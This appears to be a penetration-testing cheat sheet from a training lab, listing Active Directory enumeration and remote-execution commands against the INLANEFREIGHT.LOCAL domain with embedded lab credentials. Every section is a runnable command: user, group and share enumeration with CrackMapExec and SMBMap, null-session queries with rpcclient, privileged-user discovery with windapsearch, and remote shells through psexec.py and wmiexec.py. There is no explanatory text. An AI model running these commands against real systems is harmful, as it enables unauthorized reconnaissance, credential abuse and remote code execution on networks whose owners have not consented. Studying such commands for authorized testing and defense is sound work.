## CrackMapExec

CME - Domain User Enumeration
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

CME - Domain Group Enumeration
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

CME - Logged On Users
```shell
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Share Enumeration - Domain Controller
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

Spider_plus
```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

## SMBMap

SMBMap To Check Access
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Recursive List Of All Directories
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient

SMB NULL Session with rpcclient
```shell
rpcclient -U "" -N 172.16.5.5
```

RPCClient User Enumeration By RID
```shell
rpcclient $> queryuser 0x457
```

Enumdomusers
```shell
rpcclient $> enumdomusers
```

Using psexec.py
```shell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

Using wmiexec.py
```shell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## Windapsearch

Windapsearch - Domain Admins
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

Windapsearch - Privileged Users
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
















